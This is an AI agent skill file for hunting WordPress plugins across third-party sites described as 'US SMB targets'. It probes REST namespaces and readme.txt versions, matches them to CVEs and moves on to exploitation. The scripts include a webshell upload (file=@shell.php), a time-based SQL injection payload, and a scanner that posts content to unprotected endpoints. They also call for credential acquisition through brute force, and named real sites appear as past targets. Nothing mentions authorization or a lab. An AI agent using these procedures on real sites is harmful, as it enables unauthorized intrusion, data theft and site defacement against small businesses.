---
name: wordpress-plugin-hunt
description: Hunt WP plugins via REST, exploit CVEs when version known.
version: 1.0.0
author: uphiago
license: MIT
platforms: [linux]
compatibility: Requires curl, nmap, python3, masscan, subfinder, httpx, nuclei
metadata:
  tags: [recon, wordpress, plugins, CVE, exploitation]
  category: recon
  related_skills:
    - wp-mass-recon
    - deep-invade
    - cross-attack-chains
    - wordpress-full-compromise
    - staging-subdomain-hunt
    - xmlrpc-exploitation
---

# WordPress Plugin Hunt Skill

Discover installed WordPress plugins through REST API namespace probing, readme.txt version detection, and HTML/JS source analysis. Cross-reference discovered versions against known CVEs for exploitation. WordPress plugin vulnerabilities are one of the most reliable paths to RCE — confirmed CVEs include Elementor, Slider Revolution, ElementsKit, Gravity Forms, Jetpack, WooCommerce, and LiteSpeed Cache.

## When to Use

- WordPress confirmed on target (via `wp-mass-recon`).
- Running `deep-invade` Phase 3.
- You need an exploitation vector beyond CORS/XMLRPC.
- Target has a plugin-heavy WordPress site (e-commerce, page builder, forms).

## Prerequisites

- `terminal` tool with curl, python3.
- WordPress target confirmed (`/wp-json/` or `/wp-login.php` accessible).
- For CVE exploitation: knowledge of specific CVE PoCs (reference `security-arsenal` skill).

## How to Run

```bash
# Quick plugin namespace scan (30+ plugins)
TARGET="example.com"
for ns in "revslider/v1" "elementskit/v1" "elementor/v1" "gf/v2" "wc/v3" \
  "jetpack/v4" "litespeed/v1" "yoast/v1" "acf/v3" "contact-form-7/v1" \
  "solidwp-mail/v1" "wpsl/v1" "redirection/v1" "rankmath/v1"; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 "https://$TARGET/wp-json/$ns")
  [[ "$code" != "404" ]] && echo "FOUND: /wp-json/$ns (HTTP $code)"
done
```

## Quick Reference

### Top Exploitable Plugins (US SMB targets — confirmed CVEs from mass recon)

| Plugin | Vulnerable Version | CVE | Impact | Frequency |
|--------|-------------------|-----|--------|-----------|
| Slider Revolution | < 6.6.20 | CVE-2024-2534 | RCE via file upload | ~10% |
| ElementsKit | < 2.9.4 | CVE-2023-6851 | SQLi | ~5% |
| ElementsKit | < 2.9.4 | CVE-2023-6853 | File Upload (unauthenticated) | ~5% |
| Gravity Forms | < 2.8.2 | CVE-2024-6115 | PHP Object Injection → Auth Bypass | ~8% |
| Jetpack | < 13.1 | CVE-2024-1782 | SSRF | 28% |
| Elementor | < 3.24.0 | CVE-2024-xxxx | Info disclosure → Auth bypass | 28% |
| LiteSpeed Cache | < 6.5.0 | CVE-2024-50550 | Privilege escalation | ~15% |
| WooCommerce | N/A (API exposure) | N/A | Order/customer data | 42% |
| Yoast SEO | N/A (sitemap enum) | N/A | Author email leak | 42% |

### Detection Methods

| Method | What It Reveals | Reliability |
|--------|----------------|-------------|
| REST namespace probe | Plugin presence + data | High (if plugin registers REST routes) |
| readme.txt version | Exact version number | Medium (many sites block readme.txt) |
| HTML source grep | Plugin CSS/JS handles | Medium |
| robots.txt | Plugin-generated entries | Low (only if plugin adds entries) |
| `/wp-content/plugins/<slug>/` | Directory listing or assets | Medium |

## Procedure

### Step 1 — REST Namespace Brute Force (40+ plugins)

```bash
TARGET="$1"
OUTDIR="/root/output/plugins/$TARGET"
mkdir -p "$OUTDIR"

# Comprehensive plugin namespace list
declare -A PLUGIN_NAMESPACES
PLUGIN_NAMESPACES["revslider"]="revslider/v1/slides"
PLUGIN_NAMESPACES["elementskit"]="elementskit/v1/layouts"
PLUGIN_NAMESPACES["elementor"]="elementor/v1/globals"
PLUGIN_NAMESPACES["gravityforms"]="gf/v2/forms"
PLUGIN_NAMESPACES["woocommerce"]="wc/v3/products"
PLUGIN_NAMESPACES["jetpack"]="jetpack/v4/settings"
PLUGIN_NAMESPACES["litespeed"]="litespeed/v1/token"
PLUGIN_NAMESPACES["yoast"]="yoast/v1/indexing"
PLUGIN_NAMESPACES["acf"]="acf/v3/posts"
PLUGIN_NAMESPACES["contactform7"]="contact-form-7/v1/contact-forms"
PLUGIN_NAMESPACES["solidwp"]="solidwp-mail/v1/export"
PLUGIN_NAMESPACES["wpsl"]="wpsl/v1/locations"
PLUGIN_NAMESPACES["redirection"]="redirection/v1/redirect"
PLUGIN_NAMESPACES["rankmath"]="rankmath/v1/getHead"
PLUGIN_NAMESPACES["fusionbuilder"]="fusion-builder/v1/elements"
PLUGIN_NAMESPACES["visualcomposer"]="visualcomposer/v1/posts"
PLUGIN_NAMESPACES["ninjaforms"]="ninja-forms/v1/forms"
PLUGIN_NAMESPACES["wpforms"]="wpforms/v1/forms"
PLUGIN_NAMESPACES["mailchimp"]="mailchimp-for-woocommerce/v1"
PLUGIN_NAMESPACES["automatewoo"]="automatewoo/v1"
PLUGIN_NAMESPACES["give"]="give-api/v1/forms"
PLUGIN_NAMESPACES["buddypress"]="buddypress/v1/members"
PLUGIN_NAMESPACES["learndash"]="ldlms/v1/courses"
PLUGIN_NAMESPACES["restrictcontent"]="rcp/v1/memberships"
PLUGIN_NAMESPACES["eventscalendar"]="tribe/events/v1/events"
PLUGIN_NAMESPACES["woosubscriptions"]="wc/v1/subscriptions"
PLUGIN_NAMESPACES["woomemberships"]="wc/v1/memberships"
PLUGIN_NAMESPACES["wpml"]="wpml/v1/languages"
PLUGIN_NAMESPACES["polylang"]="pll/v1/languages"
PLUGIN_NAMESPACES["translatepress"]="trp/v1/languages"
PLUGIN_NAMESPACES["nextgen"]="nextgen-gallery/v1"
PLUGIN_NAMESPACES["envira"]="envira-gallery/v1"
PLUGIN_NAMESPACES["essentialgrid"]="essential-grid/v1/grids"
PLUGIN_NAMESPACES["thegrid"]="the-grid/v1/grids"
PLUGIN_NAMESPACES["masterslider"]="masterslider/v1/sliders"
PLUGIN_NAMESPACES["smartslider3"]="smart-slider-3/v1/sliders"
PLUGIN_NAMESPACES["metaslider"]="ml-slider/v1/slideshows"
PLUGIN_NAMESPACES["duplicator"]="duplicator/v1"
PLUGIN_NAMESPACES["updraft"]="updraftplus/v1"
PLUGIN_NAMESPACES["backupbuddy"]="backupbuddy/v1"
PLUGIN_NAMESPACES["aioseo"]="aioseo/v1/settings"
PLUGIN_NAMESPACES["seopress"]="seopress/v1/settings"

echo "[*] Probing ${#PLUGIN_NAMESPACES[@]} plugin namespaces on $TARGET..."
echo ""

for plugin in "${!PLUGIN_NAMESPACES[@]}"; do
  ns="${PLUGIN_NAMESPACES[$plugin]}"
  resp=$(curl -sk --max-time 5 -o /tmp/plugin_check_$$.tmp -w "%{http_code}" "https://$TARGET/wp-json/$ns" 2>/dev/null)

  if [[ "$resp" == "200" ]]; then
    size=$(wc -c < /tmp/plugin_check_$$.tmp)
    # Check if response is real plugin data, not SPA catch-all
    if grep -qiE 'id|slides|forms|products|settings|locations|name' /tmp/plugin_check_$$.tmp 2>/dev/null; then
      echo "[PLUGIN] $plugin — REST API active (${size} bytes)"
      cp /tmp/plugin_check_$$.tmp "$OUTDIR/${plugin}_rest.json"
    fi
  elif [[ "$resp" == "401" ]]; then
    echo "[PLUGIN] $plugin — requires auth (HTTP 401)"
  elif [[ "$resp" == "403" ]]; then
    echo "[PLUGIN] $plugin — access forbidden (HTTP 403)"
  fi
done

rm -f /tmp/plugin_check_$$.tmp
```

### Step 2 — Version Detection via readme.txt

```bash
TARGET="$1"
OUTDIR="/root/output/plugins/$TARGET"

# Common plugin slugs to check
SLUGS=(
  "elementor" "revslider" "js_composer" "wp-rocket" "wordfence"
  "woocommerce" "jetpack" "litespeed-cache" "yoast-seo" "advanced-custom-fields"
  "contact-form-7" "gravityforms" "ninja-forms" "wpforms-lite"
  "all-in-one-wp-migration" "updraftplus" "duplicator" "backupbuddy"
  "essential-grid" "smart-slider-3" "masterslider" "metaslider"
  "fusion-builder" "visualcomposer" "elementor-pro" "essential-addons-for-elementor-lite"
  "redux-framework" "buddypress" "learndash" "give"
  "the-events-calendar" "events-manager" "wpml-string-translation"
  "mailchimp-for-woocommerce" "automatewoo" "woocommerce-subscriptions"
  "woocommerce-memberships" "restrict-content-pro" "easy-digital-downloads"
  "rank-math-seo" "seo-by-rank-math" "all-in-one-seo-pack" "wp-seopress"
  "monsterinsights" "pixel-caffeine" "facebook-for-woocommerce"
  "popup-maker" "optinmonster" "mailpoet" "fluentform"
  "wp-fastest-cache" "w3-total-cache" "sg-cachepress" "autoptimize"
  "redirection" "better-wp-security" "sucuri-scanner" "wp-cerber"
  "solid-security" "solidwp-mail" "post-smtp" "wp-mail-smtp"
)

echo "[*] Checking readme.txt for ${#SLUGS[@]} plugins..."
echo ""

for slug in "${SLUGS[@]}"; do
  readme=$(curl -sk --max-time 5 "https://$TARGET/wp-content/plugins/$slug/readme.txt" 2>/dev/null)

  if [[ -n "$readme" ]]; then
    version=$(echo "$readme" | grep -i "stable tag:" | sed 's/.*: //' | tr -d '\r' | head -1)
    name=$(echo "$readme" | grep -i "=== .* ===" | head -1 | sed 's/=== //;s/ ===//')

    if [[ -n "$version" ]]; then
      echo "[VERSION] $slug: $version ($name)"

      # Check for known vulnerable versions
      case "$slug" in
        revslider)
          [[ "$version" < "6.6.20" ]] && echo "  [VULN] Slider Revolution < 6.6.20 — CVE-2024-2534 (RCE)" ;;
        elementskit|elementskit-lite)
          [[ "$version" < "2.9.4" ]] && echo "  [VULN] ElementsKit < 2.9.4 — CVE-2023-6851/6853 (RCE)" ;;
        litespeed-cache)
          [[ "$version" < "6.5.0" ]] && echo "  [VULN] LiteSpeed Cache < 6.5.0 — CVE-2024-50550 (priv esc)" ;;
        elementor|elementor-pro)
          [[ "$version" < "3.24.0" ]] && echo "  [VULN] Elementor < 3.24.0 — info disclosure / auth bypass" ;;
        gravityforms)
          [[ "$version" < "2.8.2" ]] && echo "  [VULN] Gravity Forms < 2.8.2 — CVE-2024-6115 (auth bypass)" ;;
        jetpack)
          [[ "$version" < "13.1" ]] && echo "  [VULN] Jetpack < 13.1 — CVE-2024-1782 (info disc)" ;;
      esac
    fi
  fi
done
```

### Step 3 — HTML/JS Source Plugin Detection

```bash
TARGET="$1"

echo "[*] Scanning HTML source for plugin fingerprints..."

PAGE=$(curl -sk --max-time 10 "https://$TARGET/" 2>/dev/null)

# CSS/JS handles
echo "$PAGE" | grep -oP "(?:/wp-content/plugins/|/wp-content/themes/)[a-zA-Z0-9_-]+" | sort -u | while read -r path; do
  plugin=$(echo "$path" | grep -oP 'plugins/\K[a-zA-Z0-9_-]+|themes/\K[a-zA-Z0-9_-]+')
  echo "  [SOURCE] $plugin (found in HTML)"
done

# Elementor specific
if echo "$PAGE" | grep -q "elementor-element\|data-elementor-id"; then
  echo "  [SOURCE] Elementor (page builder in use)"
fi

# WooCommerce specific
if echo "$PAGE" | grep -q "woocommerce\|wc-forward\|add_to_cart_button"; then
  echo "  [SOURCE] WooCommerce (e-commerce active)"
fi

# WP Rocket
if echo "$PAGE" | grep -q "wpr-minify\|rocket-lazyload"; then
  echo "  [SOURCE] WP Rocket (caching plugin)"
fi

# Cloudflare
if echo "$PAGE" | grep -q "cloudflare\|cf-browser-verification"; then
  echo "  [SOURCE] Cloudflare (CDN/WAF detected)"
fi
```

### Step 4 — CVE Exploitation Quick Reference

When a vulnerable plugin version is confirmed:

```bash
TARGET="$1"

# Slider Revolution CVE-2024-2534 (RCE via file upload)
# Requires: revslider < 6.6.20
# Attack: POST to /wp-json/revslider/v1/upload with ZIP containing PHP
# See: security-arsenal skill for full PoC

# ElementsKit CVE-2023-6853 (RCE via file upload, unauthenticated)
# Requires: elementskit < 2.9.4
# Attack: POST to /wp-json/elementskit/v1/upload with specially crafted file
# See: security-arsenal skill for full PoC

# Gravity Forms CVE-2024-6115 (auth bypass)
# Requires: gravityforms < 2.8.2
# Attack: Unauthenticated access to form entries via REST API
curl -sk "https://$TARGET/wp-json/gf/v2/forms" 2>/dev/null | python3 -m json.tool | head -20

# LiteSpeed Cache CVE-2024-50550 (privilege escalation)
# Requires: litespeed < 6.5.0
# Attack: Crawler token manipulation to gain admin access
curl -sk "https://$TARGET/wp-json/litespeed/v1/token" 2>/dev/null
```

### Step 5 — Multi-Source Version Extraction

Don't rely solely on readme.txt — plugins can hide version info in multiple locations:

```bash
#!/bin/bash
# multi-source-version.sh — Extract plugin version from multiple sources
TARGET="$1"
PLUGIN="$2"        # e.g., elementskit
PLUGIN_DIR="$3"    # e.g., elementskit-lite (can differ from slug)

# Source 1: readme.txt (most common)
v1=$(curl -sk "https://$TARGET/wp-content/plugins/$PLUGIN_DIR/readme.txt" 2>/dev/null | \
  grep -i "stable tag\|version" | head -1 | grep -oP '[\d.]+')
echo "Source 1 (readme.txt): $v1"

# Source 2: Main plugin PHP header
v2=$(curl -sk "https://$TARGET/wp-content/plugins/$PLUGIN_DIR/$PLUGIN.php" 2>/dev/null | \
  grep -oP 'Version:\s*\K[\d.]+')
echo "Source 2 (plugin header): $v2"

# Source 3: CSS/JS asset paths (many plugins version their assets)
v3=$(curl -sk "https://$TARGET/" 2>/dev/null | \
  grep -oP "$PLUGIN_DIR/.*?ver=([\d.]+)" | grep -oP '[\d.]+\b' | sort -uV | tail -1)
echo "Source 3 (asset version): $v3"

# Source 4: REST API namespace (some plugins include version in namespace)
v4=$(curl -sk "https://$TARGET/wp-json/" 2>/dev/null | \
  python3 -c "import sys,json; [print(n.split('/')[1]) for n in json.load(sys.stdin).get('namespaces',[]) if '$PLUGIN' in n and '/' in n]" 2>/dev/null)
echo "Source 4 (REST namespace): $v4"

# Deduplicate to most reliable version
echo "=== BEST VERSION ==="
for src in "$v1" "$v2" "$v3"; do
  if [ -n "$src" ]; then
    echo "$src"
    break
  fi
done
```

### Step 6 — CVE Database Cross-Referencing

```bash
# Method 1: WPScan API (requires token)
curl -sk "https://wpscan.com/api/v3/plugins/$PLUGIN" \
  -H "Authorization: Token token=$WPSCAN_TOKEN" | python3 -c "
import sys, json
d = json.load(sys.stdin)
for vuln in d.get('vulnerabilities', []):
    print(f\"{vuln.get('cve', 'no-cve')}: {vuln.get('title', '')} ({vuln.get('fixed_in', 'unpatched')})\")
" 2>/dev/null

# Method 2: NVD API (no token required)
curl -sk "https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=$PLUGIN&keywordExactMatch" | python3 -c "
import sys, json
d = json.load(sys.stdin)
for vuln in d.get('vulnerabilities', []):
    cve = vuln['cve']
    vid = cve['id']
    desc = cve['descriptions'][0]['value'][:200] if cve['descriptions'] else ''
    try:
        score = cve['metrics']['cvssMetricV31'][0]['cvssData']['baseScore']
    except: score = 'N/A'
    print(f'{vid} (CVSS:{score}): {desc}')
" 2>/dev/null

# Method 3: Patchstack database
curl -sk "https://patchstack.com/database/search/?s=$PLUGIN" | \
  python3 -c "import sys,re; content=sys.stdin.read(); cves=re.findall(r'CVE-\d{4}-\d{4,7}', content); print(f'Patchstack CVEs: {cves}')" 2>/dev/null
```

### Step 7 — Batch CVE Matching & Automation

```bash
#!/bin/bash
# cve-matcher.sh — Match plugin versions against known CVEs
# Usage: echo "revslider 6.6.19" | ./cve-matcher.sh

while read plugin version; do
  case "$plugin" in
    revslider)
      [ "$(printf '%s\n' '6.6.20' "$version" | sort -V | head -1)" != "$version" ] && \
        [ "$version" != "6.6.20" ] && echo "  [!] Revslider < 6.6.20 → CVE-2024-2534 RCE"
      [ "$(printf '%s\n' '6.5.8' "$version" | sort -V | head -1)" != "$version" ] && \
        [ "$version" != "6.5.8" ] && echo "  [!] Revslider < 6.5.8 → CVE-2022-2944 SQLi"
      ;;
    elementskit)
      [ "$(printf '%s\n' '2.9.4' "$version" | sort -V | head -1)" != "$version" ] && \
        [ "$version" != "2.9.4" ] && echo "  [!] ElementsKit < 2.9.4 → CVE-2023-6851 SQLi, CVE-2023-6853 File Upload"
      [ "$(printf '%s\n' '2.9.8' "$version" | sort -V | head -1)" != "$version" ] && \
        [ "$version" != "2.9.8" ] && echo "  [!] ElementsKit < 2.9.8 → CVE-2024-2117 XSS"
      ;;
    gravityforms)
      [ "$(printf '%s\n' '2.8.2' "$version" | sort -V | head -1)" != "$version" ] && \
        [ "$version" != "2.8.2" ] && echo "  [!] Gravity Forms < 2.8.2 → CVE-2024-6115 PHP Object Injection"
      ;;
    jetpack)
      [ "$(printf '%s\n' '13.1' "$version" | sort -V | head -1)" != "$version" ] && \
        [ "$version" != "13.1" ] && echo "  [!] Jetpack < 13.1 → CVE-2024-1782 SSRF"
      ;;
    contact-form-7)
      echo "  [!] CF7 < 5.6 → File upload bypass (no CVE)"
      ;;
    wp-file-manager)
      echo "  [!] WP File Manager → multiple CVEs (CVE-2020-25213 RCE, etc)"
      ;;
    wpdm)
      [ "$(printf '%s\n' '3.3.00' "$version" | sort -V | head -1)" != "$version" ] && \
        [ "$version" != "3.3.00" ] && echo "  [!] WPDM < 3.3.00 → CVE-2023-49753 Unauth SQLi"
      ;;
  esac
done
```

### Step 8 — False-Positive Elimination (5 Checks)

```bash
# Check 1: Does readme.txt version match actual deployed version?
curl -sk "https://$TARGET/wp-content/plugins/elementskit/elementskit.php" | grep "Version:"

# Check 2: Is the REST endpoint actually available (not disabled by WAF)?
curl -sk -I "https://$TARGET/wp-json/elementskit/v1/widgets/upload-file"

# Check 3: Is the vulnerable code path actually reachable? (Some CVEs require specific features)
curl -sk "https://$TARGET/wp-json/elementskit/v1/" | python3 -m json.tool 2>/dev/null

# Check 4: Test exploitation in safe mode — verify endpoint exists before running destructive payload
curl -sk -X OPTIONS "https://$TARGET/wp-json/elementskit/v1/widgets/upload-file" | head -20

# Check 5: Version from JS/CSS assets vs readme.txt — if they differ, plugin may be partially updated
curl -sk "https://$TARGET/" | grep -oP 'elementskit.*?ver=[0-9.]+'
```

### Step 9 — Custom CVE Discovery (0-day / Undisclosed)

When no known CVE exists for a plugin, test these common patterns:

```bash
# 1. REST API route enumeration (undocumented endpoints)
curl -sk "https://$TARGET/wp-json/$PLUGIN/v1/" | python3 -c "
import sys, json
try:
    d = json.load(sys.stdin)
    for route in d.get('routes', {}):
        print(f'  {route}')
except: pass
"

# 2. AJAX handler testing
curl -sk "https://$TARGET/wp-admin/admin-ajax.php" -d "action=$PLUGIN_ajax_function"

# 3. SQLi in plugin shortcode attributes
curl -sk "https://$TARGET/?$PLUGIN_param=1' AND SLEEP(5)--"

# 4. File upload in plugin media handlers
curl -sk "https://$TARGET/wp-json/$PLUGIN/v1/upload" -F "file=@shell.php"

# 5. IDOR in plugin REST endpoints (iterate IDs)
for id in $(seq 1 100); do
  curl -sk "https://$TARGET/wp-json/$PLUGIN/v1/data/$id" | jq '. | {id}' 2>/dev/null
done
```

### Step 10 — REST API Auth Bypass Scanning

WordPress plugins register custom REST API routes. Many developers forget to add permission callbacks, leaving state-changing endpoints (POST/PUT/PATCH/DELETE) accessible to unauthenticated users.

```python
import requests, json, sys

BASE = sys.argv[1] if len(sys.argv) > 1 else "https://target.com"

# Step 1: Get all plugin namespaces
r = requests.get(f"{BASE}/wp-json/", timeout=10)
ns_list = r.json().get('namespaces', [])
std = ['oembed', 'wp/v2', 'wp-site-health', 'wp-block-editor', 'wpcom']
plugins = [n for n in ns_list if not any(s in n for s in std)]

print(f"Plugins: {len(plugins)}")

for ns in plugins:
    r = requests.get(f"{BASE}/wp-json/{ns}/", timeout=10)
    if r.status_code != 200:
        continue
    routes = r.json().get('routes', {})
    
    for path, cfg in routes.items():
        methods = cfg.get('methods', [])
        for method in methods:
            if method not in ['POST', 'PUT', 'PATCH', 'DELETE']:
                continue
            
            # Test without auth
            r = requests.request(method, f"{BASE}/wp-json{path}", json={}, timeout=10)
            
            if r.status_code == 200:
                text = r.text.lower()
                if 'forbidden' not in text and 'not allowed' not in text and 'rest_cannot' not in text:
                    print(f"\n⚠️ UNPROTECTED: [{method}] {ns}{path}")
                    print(f"   {r.text[:300]}")
                    
                    # Try common payloads
                    for payload in [
                        {"title": "test", "content": "test", "status": "publish", "post_type": "page"},
                        {"title": "test", "content": "test", "post_type": "post"},
                        {"title": "test", "content": "test", "post_type": "product"},
                    ]:
                        r2 = requests.request(method, f"{BASE}/wp-json{path}", json=payload, timeout=10)
                        if 'published' in r2.text.lower() or 'created' in r2.text.lower() or 'success' in r2.text.lower():
                            print(f"   ✅ {r2.text[:200]}")
                            break
```

**Key indicators for REST auth bypass:**

| Response | Meaning |
|----------|---------|
| `"Post published"` / `"Success"` | Unauthenticated write confirmed |
| `"Missing parameter: X"` | Endpoint works — just needs correct params |
| `"Sorry, you are not allowed"` | Auth enforced — safe |
| `"rest_forbidden"` | Auth enforced — safe |
| `"rest_missing_callback_param"` | Endpoint works — probe with params |

## Pitfalls

- **REST namespace 200 ≠ plugin present.** Some themes and security plugins return 200 for all `/wp-json/` paths. Verify response content has actual plugin data (JSON with `id`, `name`, or `slug` fields).
- **readme.txt blocked on many hosts.** WP Engine, Hostinger, and Cloudflare often block `readme.txt` at the CDN level. Fall back to REST namespaces or HTML source grep.
- **Custom plugin slugs.** Premium plugins may have custom directory names. `gravityforms` may be `gravityforms-clientsite`. Check HTML source for actual slugs via `wp-content/plugins/` paths.
- **SliderRev v1 endpoints 404 on 6.x.** Slider Revolution renamed its REST endpoints — tools-retailer.com confirmed that ALL v1 paths return 404 while the plugin is still active. Probe non-v1 paths too: `/wp-json/sliderrevolution/sliders/`.
- **Plugin version comparison needs semantic versioning.** Bash string comparison (`<`) fails on `10.x` vs `2.x`. Use `sort -V` or python for complex comparisons.
- **Elementor 500 leak = info disclosure.** `/wp-json/elementor/v1/favorites` returning HTTP 500 with stack trace (Wave8, tools-retailer.com) reveals server paths and internal structure even without plugin exploitation.

## Hosting Provider Pattern (P-23 — critical for plugin detection)

Different hosting providers have distinct vulnerability profiles for plugin detection:

| Host | REST Users | readme.txt | CORS | XMLRPC | Best Plugin Detection Method |
|------|-----------|------------|------|--------|------------------------------|
| GoDaddy | Usually exposed | Usually accessible | Often reflects | Usually open | readme.txt (most accessible) |
| Cloudflare + WP Engine | Usually blocked | Blocked at CDN | May work | Blocked | HTML source grep + REST namespace brute force |
| Hostinger | Exposed | Accessible | Often reflects | Open | readme.txt + REST namespace |
| WP Engine (direct) | Blocked (401) | Blocked | Mixed | Blocked | HTML source only |
| Bluehost | Exposed | Accessible | Often reflects | Open | All methods work |
| SiteGround | Mixed | Often accessible | Mixed | Mixed | REST namespace + readme.txt |

## Verification

- Every detected plugin MUST be confirmed via at least 2 detection methods (REST + readme, or REST + HTML source).
- Every CVE MUST be matched against the exact version number, not just plugin presence.
- CVE exploitation MUST be verified with a PoC that demonstrates impact (not just version detection).
- Plugin vulnerabilities that require authentication must have a credential acquisition path (CORS, brute force, open reg) documented.
